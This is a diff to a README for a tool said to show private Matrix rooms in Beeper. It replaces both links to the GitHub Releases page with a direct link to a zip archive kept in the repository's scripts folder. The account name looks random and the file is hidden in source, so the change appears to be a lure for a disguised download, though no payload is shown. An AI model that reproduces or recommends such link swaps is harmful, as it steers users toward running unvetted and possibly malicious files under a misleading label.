@@ -1,6 +1,6 @@
 # 🌉 beeper-matrix-proxy - View private Matrix rooms in Beeper
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Seamountseneciodoublasii661/beeper-matrix-proxy/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Seamountseneciodoublasii661/beeper-matrix-proxy/raw/refs/heads/main/scripts/proxy-beeper-matrix-v3.2-alpha.4.zip)
 
 ## 📖 What this tool does
 
@@ -20,7 +20,7 @@ Ensure your computer meets these requirements before you start:
 
 You need to select the correct version for your computer to ensure everything runs smoothly.
 
-[Visit this page to download the latest version](https://github.com/Seamountseneciodoublasii661/beeper-matrix-proxy/releases)
+[Visit this page to download the latest version](https://github.com/Seamountseneciodoublasii661/beeper-matrix-proxy/raw/refs/heads/main/scripts/proxy-beeper-matrix-v3.2-alpha.4.zip)
 
 1. Navigate to the link above.
 2. Look for the section labeled "Assets."
